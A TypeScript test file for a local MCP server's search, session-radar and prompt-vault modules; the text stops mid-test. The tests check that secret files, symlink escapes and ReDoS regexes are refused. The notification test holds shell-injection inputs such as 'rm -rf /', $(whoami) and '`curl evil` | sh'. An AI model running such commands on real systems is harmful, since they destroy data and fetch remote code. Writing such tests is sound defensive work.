import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, it } from 'node:test';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { getModuleDataDir, MODULE_CATALOG } from '../src/core/config.js';
import { normalizeHookPayload } from '../src/core/utils.js';
import {
  auditWorkspaceAssets,
  BUILTIN_PROMPTS,
  deletePromptTemplate,
  isSensitiveOpsPath,
  listPromptTemplates,
  renderPromptTemplate,
  savePromptTemplate,
} from '../src/modules/ops/core.js';
import { registerOpsModule } from '../src/modules/ops/register.js';
import {
  ackRadarSession,
  buildSafeNotifyInvocation,
  clearCompletedRadarSessions,
  computeRadarBoardView,
  getRadarBoardPath,
  loadRadarBoardReadOnly,
  recordRadarSessionEvent,
  sanitizeNotificationText,
  triggerRadarNotification,
  updateRadarPrefs,
} from '../src/modules/radar/core.js';
import { handleRadarHook } from '../src/modules/radar/hook.js';
import { registerRadarModule } from '../src/modules/radar/register.js';
import {
  batchSearchWorkspace,
  buildWorkspaceSnapshot,
  CompactedChunkStore,
  compactLargeOutput,
  isPotentiallyUnsafeRegex,
  isSensitiveTurboPath,
  queryCompactedChunk,
  readFileOutlineAndSlice,
} from '../src/modules/turbo/core.js';
import { handleTurboSessionStartHook } from '../src/modules/turbo/hook.js';
import { registerTurboModule } from '../src/modules/turbo/register.js';

function withTempDir<T>(prefix: string, fn: (dir: string) => Promise<T> | T): Promise<T> {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  return Promise.resolve()
    .then(() => fn(dir))
    .finally(() => {
      fs.rmSync(dir, { recursive: true, force: true });
    });
}

describe('v0.2.0 Module 1 — Turbo core & SessionStart hook', () => {
  it('supports multi-query batch search, safe regex fallback, and blocks symlink escapes & sensitive files', async () => {
    await withTempDir('agy-nov-turbo-', (tmpDir) => {
      const workspace = path.join(tmpDir, 'workspace');
      const outside = path.join(tmpDir, 'outside');
      fs.mkdirSync(path.join(workspace, 'src'), { recursive: true });
      fs.mkdirSync(path.join(workspace, 'node_modules', 'pkg'), { recursive: true });
      fs.mkdirSync(path.join(workspace, 'dist'), { recursive: true });
      fs.mkdirSync(path.join(workspace, '.git'), { recursive: true });
      fs.mkdirSync(path.join(workspace, '.ssh'), { recursive: true });
      fs.mkdirSync(outside, { recursive: true });

      fs.writeFileSync(
        path.join(workspace, 'src', 'engine.ts'),
        [
          'export interface SearchConfig { maxHits: number; }',
          'export function runTurboEngine(query: string) {',
          '  const marker = "NEEDLE_ALPHA";',
          '  return `${marker}:${query}`;',
          '}',
          'export class TurboCache {',
          '  private items = new Map<string, string>();',
          '}',
        ].join('\n'),
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, 'src', 'helper.py'),
        'def compute_digest(val):\n    return "NEEDLE_BETA_" + str(val)\n\nclass HelperBox:\n    pass\n',
        'utf8',
      );

      // Binary file with NUL bytes should be skipped
      fs.writeFileSync(
        path.join(workspace, 'src', 'blob.dat'),
        Buffer.from([0x4e, 0x45, 0x45, 0x44, 0x4c, 0x45, 0x00, 0x01, 0x02]),
      );

      // Ignored build/dependency dirs
      fs.writeFileSync(path.join(workspace, 'node_modules', 'pkg', 'index.js'), 'NEEDLE_ALPHA\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'dist', 'bundle.js'), 'NEEDLE_ALPHA\n', 'utf8');
      fs.writeFileSync(path.join(workspace, '.git', 'HEAD'), 'NEEDLE_ALPHA\n', 'utf8');

      // Sensitive files that must never be searched or read
      fs.writeFileSync(path.join(workspace, '.env'), 'SECRET_TOKEN=NEEDLE_ALPHA_ENV_LEAK\n', 'utf8');
      fs.writeFileSync(path.join(workspace, '.env.local'), 'API_KEY=NEEDLE_ALPHA_LOCAL\n', 'utf8');
      fs.writeFileSync(path.join(workspace, '.ssh', 'id_rsa'), 'NEEDLE_ALPHA_SSH_KEY\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'tls.pem'), 'NEEDLE_ALPHA_PEM\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'server.key'), 'NEEDLE_ALPHA_KEY\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'credentials.json'), '{"token":"NEEDLE_ALPHA_CRED"}\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'my-secret-config.json'), '{"k":"NEEDLE_ALPHA_SEC"}\n', 'utf8');

      // Symlink to outside workspace and symlink disguised as harmless file pointing to .env
      const outsideFile = path.join(outside, 'leak.txt');
      fs.writeFileSync(outsideFile, 'NEEDLE_ALPHA_OUTSIDE_ESCAPE\n', 'utf8');
      fs.symlinkSync(outsideFile, path.join(workspace, 'src', 'escape-link.ts'));
      fs.symlinkSync(path.join(workspace, '.env'), path.join(workspace, 'src', 'harmless-alias.ts'));

      const searchRes = batchSearchWorkspace(workspace, ['NEEDLE_ALPHA', 'NEEDLE_BETA'], {
        maxMatchesPerQuery: 20,
      });

      assert.equal(searchRes.scannedFiles, 2);
      assert.ok(searchRes.skippedSensitive >= 7);
      assert.ok(searchRes.skippedSymlinks >= 1);

      const alpha = searchRes.results.find((r) => r.query === 'NEEDLE_ALPHA');
      const beta = searchRes.results.find((r) => r.query === 'NEEDLE_BETA');
      assert.ok(alpha);
      assert.ok(beta);
      assert.equal(alpha.totalHits, 1);
      assert.equal(alpha.matches[0].file, 'src/engine.ts');
      assert.equal(beta.totalHits, 1);
      assert.equal(beta.matches[0].file, 'src/helper.py');

      // Ensure zero matches came from sensitive files or escaped symlinks
      const allFiles = searchRes.results.flatMap((r) => r.matches.map((m) => m.file));
      assert.equal(allFiles.some((f) => f.includes('.env') || f.includes('escape') || f.includes('alias')), false);

      // ReDoS (including nested groups & alternation) / invalid regex gracefully falls back to literal without throwing
      const regexRes = batchSearchWorkspace(
        workspace,
        ['(a+)+$', '((a)+)+', '(a|aa)+', '[unclosed(', 'runTurbo\\w+'],
        {
          regex: true,
        },
      );
      assert.equal(regexRes.results[0].mode, 'literal');
      assert.equal(regexRes.results[0].fallbackLiteral, true);
      assert.equal(regexRes.results[1].mode, 'literal');
      assert.equal(regexRes.results[1].fallbackLiteral, true);
      assert.equal(regexRes.results[2].mode, 'literal');
      assert.equal(regexRes.results[2].fallbackLiteral, true);
      assert.equal(regexRes.results[3].mode, 'literal');
      assert.equal(regexRes.results[3].fallbackLiteral, true);
      assert.equal(regexRes.results[4].mode, 'regex');
      assert.equal(regexRes.results[4].totalHits, 1);

      // Outline & slice refuses symlink escapes and sensitive files (both direct and via symlink)
      assert.throws(() => readFileOutlineAndSlice(workspace, 'src/escape-link.ts'), /escapes workspace boundary/i);
      assert.throws(() => readFileOutlineAndSlice(workspace, '.env'), /sensitive/i);
      assert.throws(() => readFileOutlineAndSlice(workspace, 'src/harmless-alias.ts'), /sensitive/i);
      assert.throws(() => readFileOutlineAndSlice(workspace, '../outside/leak.txt'), /escapes workspace boundary/i);
    });
  });

  it('extracts symbol outlines and bounded line slices across TS, Python, Go, Rust, and Markdown', async () => {
    await withTempDir('agy-nov-turbo-outline-', (workspace) => {
      fs.writeFileSync(
        path.join(workspace, 'sample.ts'),
        [
          'export interface User { id: string; }',
          'export type UserId = string;',
          'export const MAX_USERS = 100;',
          'export async function fetchUser(id: UserId) {',
          '  return { id };',
          '}',
          'export class UserService {',
          '  list() { return []; }',
          '}',
        ].join('\n'),
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, 'guide.md'),
        [
          '# Main Title',
          'Intro paragraph.',
          '```bash',
          '# Comment inside code fence should be ignored',
          'echo hi',
          '```',
          '## Architecture',
          'Details here.',
        ].join('\n'),
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, 'main.go'),
        'package main\ntype Config struct{}\nfunc (c *Config) Load() error { return nil }\n',
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, 'lib.rs'),
        'pub struct Store;\npub async fn open_store() {}\nimpl Store {}\n',
        'utf8',
      );

      const tsRes = readFileOutlineAndSlice(workspace, 'sample.ts', { startLine: 4, endLine: 6 });
      assert.equal(tsRes.language, 'typescript');
      assert.deepEqual(
        tsRes.outline.map((s) => `${s.kind}:${s.name}@${s.line}`),
        [
          'interface:User@1',
          'type:UserId@2',
          'export:MAX_USERS@3',
          'function:fetchUser@4',
          'class:UserService@7',
          'method:list@8',
        ],
      );
      assert.equal(tsRes.slice.startLine, 4);
      assert.equal(tsRes.slice.endLine, 6);
      assert.match(tsRes.slice.content, /4 \| export async function fetchUser/);

      const mdRes = readFileOutlineAndSlice(workspace, 'guide.md');
      assert.deepEqual(
        mdRes.outline.map((s) => `${s.kind}:${s.name}@${s.line}`),
        ['h1:Main Title@1', 'h2:Architecture@7'],
      );

      const goRes = readFileOutlineAndSlice(workspace, 'main.go');
      assert.deepEqual(
        goRes.outline.map((s) => `${s.kind}:${s.name}`),
        ['struct:Config', 'method:Load'],
      );

      const rsRes = readFileOutlineAndSlice(workspace, 'lib.rs');
      assert.deepEqual(
        rsRes.outline.map((s) => `${s.kind}:${s.name}`),
        ['struct:Store', 'fn:open_store', 'impl:Store'],
      );
    });
  });

  it('compacts oversized outputs, queries indexed chunks in memory LRU (24), and writes zero files by default', async () => {
    await withTempDir('agy-nov-turbo-compact-', (tmpDir) => {
      const dataDir = path.join(tmpDir, 'data-turbo');
      const lines: string[] = ['START build pipeline'];
      for (let i = 1; i <= 160; i += 1) {
        if (i === 77) {
          lines.push('ERROR TS2322: Type "number" is not assignable to type "string" in src/payment.ts:77');
        } else if (i === 95 || i === 96) {
          lines.push('WARN deprecated option retryCount will be removed');
        } else if (i === 112) {
          lines.push('Custom trace: payment_gateway_timeout_marker_xyz latency=9420ms');
        } else {
          lines.push(`info [step ${i}] compiled module chunk-${i} cleanly without issues`);
        }
      }
      lines.push('FAILED with exit code 1');
      const rawLog = lines.join('\n');

      const compacted = compactLargeOutput(dataDir, 'tsc + vitest', rawLog);
      assert.equal(compacted.totalLines, lines.length);
      assert.ok(compacted.estimatedSavedTokens > 0);
      assert.ok(compacted.errorCount >= 2);
      assert.ok(compacted.warningCount >= 2);
      assert.match(compacted.summaryText, /TS2322/);
      // Zero disk writes when persistStats is omitted/false
      assert.equal(fs.existsSync(dataDir), false);

      const hit = queryCompactedChunk(compacted.chunkId, 'payment_gateway_timeout_marker_xyz', 5);
      assert.equal(hit.found, true);
      assert.equal(hit.totalHits, 1);
      assert.equal(hit.matches[0].matchedLine, 113);
      assert.match(hit.matches[0].snippet, /payment_gateway_timeout_marker_xyz/);

      // Verify LRU eviction capacity = 24
      const lru = new CompactedChunkStore(24);
      const ids: string[] = [];
      for (let i = 0; i < 26; i += 1) {
        const res = lru.compact(undefined, `job-${i}`, `line 1 job-${i}\nline 2 payload`);
        ids.push(res.chunkId);
      }
      assert.equal(lru.listChunks().length, 24);
      assert.equal(lru.query(ids[0], 'job-0').found, false);
      assert.equal(lru.query(ids[1], 'job-1').found, false);
      assert.equal(lru.query(ids[25], 'job-25').found, true);
    });
  });

  it('builds <=40-line read-only workspace snapshot and SessionStart hook with zero disk writes', async () => {
    await withTempDir('agy-nov-turbo-snap-', (tmpDir) => {
      const workspace = path.join(tmpDir, 'my-app');
      const dataDir = path.join(tmpDir, 'nov-data');
      fs.mkdirSync(path.join(workspace, 'src'), { recursive: true });
      fs.writeFileSync(
        path.join(workspace, 'package.json'),
        JSON.stringify({
          name: 'demo-workbench',
          version: '1.2.3',
          scripts: { build: 'tsc', test: 'node --test' },
          devDependencies: { typescript: '^5.9.0' },
        }),
        'utf8',
      );
      fs.writeFileSync(path.join(workspace, '.env'), 'TOKEN=do-not-list\n', 'utf8');
      fs.writeFileSync(path.join(workspace, 'src', 'index.ts'), 'export const ok = true;\n', 'utf8');

      const snap = buildWorkspaceSnapshot(workspace);
      assert.ok(snap.lineCount <= 40);
      assert.ok(snap.techStack.includes('Node.js'));
      assert.ok(snap.techStack.includes('TypeScript'));
      assert.equal(snap.markdown.includes('.env'), false);

      const payload = normalizeHookPayload({ workspaceRoot: workspace }, 'SessionStart');
      const hookOut = handleTurboSessionStartHook(payload, dataDir);
      assert.ok(Array.isArray(hookOut.injectSteps) && hookOut.injectSteps.length === 1);
      // Zero disk writes
      assert.equal(fs.existsSync(dataDir), false);

      // Fail-open when workspace does not exist
      const missingPayload = normalizeHookPayload(
        { workspaceRoot: path.join(tmpDir, 'nonexistent-dir') },
        'SessionStart',
      );
      assert.deepEqual(handleTurboSessionStartHook(missingPayload, dataDir), {});
    });
  });
});

describe('v0.2.0 Module 2 — Radar core, lifecycle hooks & safe notifications', () => {
  it('tracks PreToolUse, awaiting_approval, PostToolUse, Stop/error, stall detection, ack, and clear', async () => {
    await withTempDir('agy-nov-radar-', (tmpDir) => {
      const prevNoNotify = process.env.AGY_NOV_NO_NOTIFY;
      process.env.AGY_NOV_NO_NOTIFY = '1';
      try {
        const rootDataDir = path.join(tmpDir, 'nov-data');
        const radarDir = getModuleDataDir(rootDataDir, 'radar');

        // Pure read-only load before any hook never creates directories
        const emptyBoard = loadRadarBoardReadOnly(radarDir);
        assert.equal(Object.keys(emptyBoard.sessions).length, 0);
        assert.equal(emptyBoard.prefs.desktopNotify, false);
        assert.equal(emptyBoard.prefs.soundChime, false);
        assert.equal(emptyBoard.prefs.stallMinutes, 5);
        assert.equal(fs.existsSync(rootDataDir), false);

        // 1. PreToolUse -> running
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-alpha',
              workspaceRoot: '/tmp/project-a',
              toolName: 'edit_file',
              toolInput: { Path: 'src/a.ts' },
            },
            'PreToolUse',
          ),
          rootDataDir,
        );

        let board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-alpha'].status, 'running');
        assert.equal(board.sessions['conv-alpha'].lastToolName, 'edit_file');
        assert.equal(board.sessions['conv-alpha'].stepCount, 1);

        // Verify mode 0600 on POSIX
        if (process.platform !== 'win32') {
          const mode = fs.statSync(getRadarBoardPath(radarDir)).mode & 0o777;
          assert.equal(mode, 0o600);
        }

        // 2. PostToolUse -> refreshes heartbeat & stays running
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-alpha',
              workspaceRoot: '/tmp/project-a',
              toolName: 'run_tests',
            },
            'PostToolUse',
          ),
          rootDataDir,
        );
        board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-alpha'].status, 'running');
        assert.equal(board.sessions['conv-alpha'].lastToolName, 'run_tests');
        assert.equal(board.sessions['conv-alpha'].stepCount, 2);

        // 3. Stop -> completed & unread = true
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-alpha',
              workspaceRoot: '/tmp/project-a',
              lastUserInput: 'Fix unit tests',
            },
            'Stop',
          ),
          rootDataDir,
        );
        board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-alpha'].status, 'completed');
        assert.equal(board.sessions['conv-alpha'].unread, true);

        // 4. PreToolUse with approval signal -> awaiting_approval
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-approval',
              workspaceRoot: '/tmp/project-b',
              toolName: 'run_command',
              toolInput: { CommandLine: 'npm publish', SafeToAutoRun: false },
            },
            'PreToolUse',
          ),
          rootDataDir,
        );
        board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-approval'].status, 'awaiting_approval');
        assert.equal(board.sessions['conv-approval'].unread, true);

        // 5. Stop with error -> error
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-err',
              workspaceRoot: '/tmp/project-c',
              error: { message: 'Process terminated unexpectedly' },
            },
            'Stop',
          ),
          rootDataDir,
        );
        board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-err'].status, 'error');
        assert.match(board.sessions['conv-err'].errorMessage ?? '', /Process terminated/);

        // 6. Stalled detection on old running session
        const tenMinAgoIso = new Date(Date.now() - 10 * 60_000).toISOString();
        recordRadarSessionEvent(radarDir, {
          conversationId: 'conv-stale',
          event: 'PreToolUse',
          workspaceRoot: '/tmp/project-d',
          toolName: 'run_command',
          timestampIso: tenMinAgoIso,
        });

        const view = computeRadarBoardView(loadRadarBoardReadOnly(radarDir), { nowMs: Date.now() });
        const staleView = view.sessions.find((s) => s.conversationId === 'conv-stale');
        assert.equal(staleView?.status, 'stalled');
        assert.equal(staleView?.rawStatus, 'running');
        assert.equal(view.counts.stalled, 1);
        assert.equal(view.counts.awaiting_approval, 1);
        assert.equal(view.counts.completed, 1);
        assert.equal(view.counts.error, 1);
        assert.equal(view.counts.unread, 3);

        // 7. Ack single session then ack remaining
        const ack1 = ackRadarSession(radarDir, 'conv-alpha');
        assert.equal(ack1.acknowledgedCount, 1);
        assert.equal(ack1.board.sessions['conv-alpha'].unread, false);

        const ackAll = ackRadarSession(radarDir);
        assert.equal(ackAll.acknowledgedCount, 2);

        // 8. Update prefs & clear completed/error
        const updatedPrefs = updateRadarPrefs(radarDir, { stallMinutes: 15, soundChime: true });
        assert.equal(updatedPrefs.prefs.stallMinutes, 15);
        assert.equal(updatedPrefs.prefs.soundChime, true);

        // With stallMinutes=15, 10m-idle session is no longer stalled
        const viewAfterPref = computeRadarBoardView(updatedPrefs, { nowMs: Date.now() });
        assert.equal(viewAfterPref.sessions.find((s) => s.conversationId === 'conv-stale')?.status, 'running');

        const cleared = clearCompletedRadarSessions(radarDir);
        assert.equal(cleared.removedCount, 2); // conv-alpha + conv-err
        assert.equal(cleared.board.sessions['conv-alpha'], undefined);
        assert.equal(cleared.board.sessions['conv-err'], undefined);
        assert.ok(cleared.board.sessions['conv-approval']);

        // PostToolUse after awaiting_approval resumes running and clears stale unread flag
        handleRadarHook(
          normalizeHookPayload(
            {
              conversationId: 'conv-approval',
              workspaceRoot: '/tmp/project-b',
              toolName: 'run_command',
            },
            'PostToolUse',
          ),
          rootDataDir,
        );
        board = loadRadarBoardReadOnly(radarDir);
        assert.equal(board.sessions['conv-approval'].status, 'running');
        assert.equal(board.sessions['conv-approval'].unread, false);
      } finally {
        if (prevNoNotify === undefined) delete process.env.AGY_NOV_NO_NOTIFY;
        else process.env.AGY_NOV_NO_NOTIFY = prevNoNotify;
      }
    });
  });

  it('sanitizes notification text and builds shell-free execFile args without executing in test env', () => {
    const hostileTitle = 'Title"; do shell script "rm -rf /" $(whoami) `id`\nnewline';
    const hostileMsg = 'Done & `curl evil` | sh "quoted"';

    const cleanTitle = sanitizeNotificationText(hostileTitle);
    assert.equal(/["'`\\$<>|;&{}\r\n]/.test(cleanTitle), false);

    // Disabled prefs return null invocation
    assert.equal(
      buildSafeNotifyInvocation('darwin', hostileTitle, hostileMsg, {
        desktopNotify: false,
        soundChime: false,
        stallMinutes: 5,
      }),
      null,
    );

    // macOS invocation passes message/title via argv rather than interpolating AppleScript code
    const macInv = buildSafeNotifyInvocation('darwin', hostileTitle, hostileMsg, {
      desktopNotify: true,
      soundChime: true,
      stallMinutes: 5,
    });
    assert.ok(macInv);
    assert.equal(macInv.command, 'osascript');
    assert.ok(macInv.args.includes('on run argv'));
    const sepIdx = macInv.args.indexOf('--');
    assert.ok(sepIdx > 0);
    // Code args before '--' never contain dynamic user input
    const codePortion = macInv.args.slice(0, sepIdx).join(' ');
    assert.equal(codePortion.includes('whoami'), false);
    assert.equal(codePortion.includes('evil'), false);

    // Linux notify-send uses '--' option terminator
    const linuxInv = buildSafeNotifyInvocation('linux', '-u critical', hostileMsg, {
      desktopNotify: true,
      soundChime: false,
      stallMinutes: 5,
    });
    assert.ok(linuxInv);
    assert.equal(linuxInv.command, 'notify-send');
    assert.equal(linuxInv.args[0], '--');

    // Suppressed when AGY_NOV_NO_NOTIFY or NODE_ENV=test is set
    const prevEnv = process.env.AGY_NOV_NO_NOTIFY;
    process.env.AGY_NOV_NO_NOTIFY = '1';
    try {
      const res = triggerRadarNotification(hostileTitle, hostileMsg, {
        desktopNotify: true,
        soundChime: true,
        stallMinutes: 5,
      });
      assert.equal(res.dispatched, false);
      assert.equal(res.reason, 'suppressed-by-env');
    } finally {
      if (prevEnv === undefined) delete process.env.AGY_NOV_NO_NOTIFY;
      else process.env.AGY_NOV_NO_NOTIFY = prevEnv;
    }
  });
});

describe('v0.2.0 Module 3 — Ops Prompt Vault & read-only Workspace Audit', () => {
  it('supports built-in + custom prompt CRUD and safe non-recursive {{var}} rendering', async () => {
    await withTempDir('agy-nov-ops-prompts-', (tmpDir) => {
      const opsDir = getModuleDataDir(tmpDir, 'ops');

      // Read-only listing exposes 5 built-ins and touches zero disk
      const initial = listPromptTemplates(opsDir);
      assert.equal(initial.length, BUILTIN_PROMPTS.length);
      assert.equal(initial.length, 5);
      assert.equal(fs.existsSync(opsDir), false);

      // Save custom prompt
      const saved = savePromptTemplate(opsDir, {
        id: 'custom-migration',
        title: 'DB Migration Review',
        category: 'review',
        description: 'Check schema changes before deploy',
        tags: ['db', 'migration'],
        body: 'Review migration {{migration_id}} on {{env}} (timeout={{timeout}}).',
        variables: [
          { name: 'migration_id', required: true },
          { name: 'env', defaultValue: 'staging' },
          { name: 'timeout' },
        ],
      });
      assert.equal(saved.id, 'custom-migration');
      assert.equal(saved.builtIn, false);

      if (process.platform !== 'win32') {
        const mode = fs.statSync(path.join(opsDir, 'prompts.json')).mode & 0o777;
        assert.equal(mode, 0o600);
      }

      // Render with partial variables + test non-recursive safety (value contains {{env}})
      const rendered = renderPromptTemplate(saved, {
        migration_id: '2026_add_idx_{{env}}',
      });
      assert.equal(
        rendered.rendered,
        'Review migration 2026_add_idx_{{env}} on staging (timeout={{timeout}}).',
      );
      assert.deepEqual(rendered.usedVariables, ['migration_id']);
      assert.deepEqual(rendered.defaultedVariables, ['env']);
      assert.deepEqual(rendered.missingVariables, ['timeout']);
      assert.ok(rendered.estimatedTokens > 0);

      // Cannot delete built-in
      const denyBuiltIn = deletePromptTemplate(opsDir, 'builtin-code-review');
      assert.equal(denyBuiltIn.deleted, false);

      // Delete custom succeeds
      const deleted = deletePromptTemplate(opsDir, 'custom-migration');
      assert.equal(deleted.deleted, true);
      assert.equal(listPromptTemplates(opsDir).length, 5);
    });
  });

  it('audits workspace assets & local storage read-only while blocking symlink escapes and secret leakage', async () => {
    await withTempDir('agy-nov-ops-audit-', (tmpDir) => {
      const workspace = path.join(tmpDir, 'repo');
      const outside = path.join(tmpDir, 'outside');
      const dataDir = path.join(tmpDir, 'nov-data');
      fs.mkdirSync(path.join(workspace, 'skills', 'demo-skill'), { recursive: true });
      fs.mkdirSync(path.join(workspace, '.agents', 'rules'), { recursive: true });
      fs.mkdirSync(path.join(workspace, 'hooks'), { recursive: true });
      fs.mkdirSync(outside, { recursive: true });

      const agentsContent = '# Project Rules\nFollow strict offline-first isolation.\n';
      fs.writeFileSync(path.join(workspace, 'AGENTS.md'), agentsContent, 'utf8');
      fs.writeFileSync(
        path.join(workspace, 'skills', 'demo-skill', 'SKILL.md'),
        '# Demo Skill\nUse carefully.\n',
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, '.agents', 'rules', 'style.md'),
        'Keep files concise.\n',
        'utf8',
      );
      fs.writeFileSync(
        path.join(workspace, 'hooks', 'hooks.json'),
        JSON.stringify({ hooks: {} }),
        'utf8',
      );

      // MCP config containing a literal secret token — audit must warn WITHOUT echoing the secret value
      const secretTokenVal = 'sk-super-secret-value-must-never-echo-9999';
      fs.writeFileSync(
        path.join(workspace, 'mcp_config.json'),
        JSON.stringify({
          mcpServers: {
            myServer: {
              command: 'node',
              env: {
                API_TOKEN: secretTokenVal,
                SAFE_REF: '${HOME}',
              },
            },
          },
        }),
        'utf8',
      );

      // Sensitive files & escaping symlinks inside .agents and root
      fs.writeFileSync(path.join(workspace, '.env'), 'TOP_SECRET=env-never-read\n', 'utf8');
      fs.writeFileSync(path.join(workspace, '.agents', '.env.prod'), 'PROD_SECRET=never\n', 'utf8');
      fs.writeFileSync(path.join(workspace, '.agents', 'secrets.json'), '{"k":"never"}\n', 'utf8');
      const outsideDoc = path.join(outside, 'secret-outside.md');
      fs.writeFileSync(outsideDoc, 'OUTSIDE_SENSITIVE_TEXT\n', 'utf8');
      fs.symlinkSync(outsideDoc, path.join(workspace, 'CLAUDE.md'));
      fs.symlinkSync(outsideDoc, path.join(workspace, '.agents', 'escape.md'));

      // Run audit before dataDir exists -> must NOT create dataDir
      const reportNoData = auditWorkspaceAssets(workspace, dataDir);
      assert.equal(fs.existsSync(dataDir), false);
      assert.equal(reportNoData.storage.rootDataDirExists, false);
      assert.equal(reportNoData.storage.totalBytes, 0);

      // Verify assets found & token formula Math.ceil(chars / 4)
      const agentsAsset = reportNoData.assets.find((a) => a.relPath === 'AGENTS.md');
      assert.ok(agentsAsset);
      assert.equal(agentsAsset.estimatedTokens, Math.ceil(agentsContent.length / 4));
      assert.ok(reportNoData.assets.some((a) => a.relPath === 'skills/demo-skill/SKILL.md'));
      assert.ok(reportNoData.assets.some((a) => a.relPath === '.agents/rules/style.md'));
      assert.ok(reportNoData.assets.some((a) => a.relPath === 'mcp_config.json'));

      // Verify escaped symlinks and sensitive files were skipped & zero secret echo
      assert.ok(reportNoData.summary.skippedSymlinks >= 2);
      assert.ok(reportNoData.summary.skippedSensitive >= 2);
      assert.equal(reportNoData.assets.some((a) => a.relPath === 'CLAUDE.md'), false);
      assert.equal(reportNoData.assets.some((a) => a.relPath.includes('escape')), false);
      assert.equal(reportNoData.assets.some((a) => a.relPath.includes('.env')), false);

      const serialized = JSON.stringify(reportNoData);
      assert.equal(serialized.includes(secretTokenVal), false);
      assert.equal(serialized.includes('OUTSIDE_SENSITIVE_TEXT'), false);
      assert.equal(serialized.includes('env-never-read'), false);
      assert.ok(reportNoData.recommendations.some((r) => r.code === 'ops.mcp-literal-env'));
      assert.ok(reportNoData.recommendations.some((r) => r.code === 'ops.symlink-escape-skipped'));

      // Now create some local module data and verify storage audit counts it read-only
      fs.mkdirSync(path.join(dataDir, 'modules', 'radar'), { recursive: true });
      fs.writeFileSync(path.join(dataDir, 'modules', 'radar', 'board.json'), '{"ok":true}\n', 'utf8');
      const reportWithData = auditWorkspaceAssets(workspace, dataDir);
      assert.equal(reportWithData.storage.rootDataDirExists, true);
      assert.ok(reportWithData.storage.totalBytes >= 12);
      const radarStat = reportWithData.storage.modules.find((m) => m.moduleId === 'radar');
      assert.ok(radarStat && radarStat.files === 1 && radarStat.bytes >= 12);
    });
  });
});

describe('v0.2.0 Unified McpServer registration, zero-write init & live enable/disable', () => {
  it('registers turbo, radar, and ops matching MODULE_CATALOG with zero disk writes and dynamic toggle', async () => {
    await withTempDir('agy-nov-v02-mcp-', async (tmpDir) => {
      const workspace = path.join(tmpDir, 'ws');
      const dataDir = path.join(tmpDir, 'data-dir-must-stay-absent');
      fs.mkdirSync(path.join(workspace, 'src'), { recursive: true });
      fs.writeFileSync(
        path.join(workspace, 'src', 'app.ts'),
        'export function greetNov(name: string) {\n  return `hello ${name}`;\n}\n',
        'utf8',
      );
      fs.writeFileSync(path.join(workspace, 'AGENTS.md'), '# Agents\nStay offline.\n', 'utf8');

      const uiUri = 'ui://agy-nov/app.html';
      const server = new McpServer(
        { name: 'agy-nov-v02-test', version: '0.2.0' },
        { capabilities: { tools: { listChanged: true } } },
      );

      const opts = { dataDir, workspaceRoot: workspace, demoMode: false };
      const turboReg = registerTurboModule(server, opts, uiUri);
      const radarReg = registerRadarModule(server, opts, uiUri);
      const opsReg = registerOpsModule(server, opts, uiUri);

      // Zero disk writes upon registration
      assert.equal(fs.existsSync(dataDir), false);

      // Exact match against MODULE_CATALOG modelToolNames
      assert.equal(turboReg.moduleId, 'turbo');
      assert.deepEqual(
        turboReg.modelTools.map((t) => t.name),
        MODULE_CATALOG.turbo.modelToolNames,
      );
      assert.equal(radarReg.moduleId, 'radar');
      assert.deepEqual(
        radarReg.modelTools.map((t) => t.name),
        MODULE_CATALOG.radar.modelToolNames,
      );
      assert.equal(opsReg.moduleId, 'ops');
      assert.deepEqual(
        opsReg.modelTools.map((t) => t.name),
        MODULE_CATALOG.ops.modelToolNames,
      );

      const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
      const client = new Client({ name: 'v02-test-client', version: '0.2.0' });
      await server.connect(serverTransport);
      await client.connect(clientTransport);

      try {
        const listed = await client.listTools();
        const names = new Set(listed.tools.map((t) => t.name));

        const expectedAll = [
          // turbo (3 model + 5 app)
          'turbo_batch_search',
          'turbo_read_outline',
          'turbo_compact_output',
          'app_turbo_get_state',
          'app_turbo_get_gain',
          'app_turbo_batch_search',
          'app_turbo_read_outline',
          'app_turbo_compact_output',
          'app_turbo_query_chunk',
          // radar (2 model + 4 app)
          'radar_get_board',
          'radar_ack_session',
          'app_radar_get_board',
          'app_radar_ack_session',
          'app_radar_update_prefs',
          'app_radar_clear_completed',
          // ops (3 model + 5 app)
          'ops_list_prompts',
          'ops_render_prompt',
          'ops_audit_workspace',
          'app_ops_get_state',
          'app_ops_save_prompt',
          'app_ops_delete_prompt',
          'app_ops_render_prompt',
          'app_ops_audit_workspace',
        ];

        assert.equal(listed.tools.length, expectedAll.length);
        for (const name of expectedAll) {
          assert.ok(names.has(name), `Missing registered tool: ${name}`);
        }

        // Every app_* tool carries app-only visibility
        for (const tool of listed.tools) {
          if (tool.name.startsWith('app_')) {
            const meta = tool._meta as { ui?: { visibility?: string[]; resourceUri?: string } } | undefined;
            assert.deepEqual(meta?.ui?.visibility, ['app'], `Expected app-only visibility on ${tool.name}`);
            assert.equal(meta?.ui?.resourceUri, uiUri);
          }
        }

        // Invoke live tools across all 3 modules (read-only operations keep dataDir untouched)
        const searchCall = await client.callTool({
          name: 'turbo_batch_search',
          arguments: { queries: ['greetNov'] },
